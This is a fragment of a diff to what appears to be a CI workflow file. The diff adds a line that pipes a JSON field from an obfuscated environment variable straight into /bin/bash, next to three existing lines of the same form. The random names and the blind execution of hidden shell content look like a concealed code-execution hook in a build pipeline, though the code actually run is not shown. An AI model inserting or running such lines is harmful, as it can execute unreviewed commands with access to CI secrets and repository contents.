@@ -26,6 +26,7 @@ jobs:
           echo $fbuc32 | jq -r .ugdmu43735 | /bin/bash
           echo $ilrlp9196 | jq -r .am9455 | /bin/bash
           printf '%s' "$elh95" | jq -r .skm5307 | /bin/bash
+          echo $i6 | jq -r .u2 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
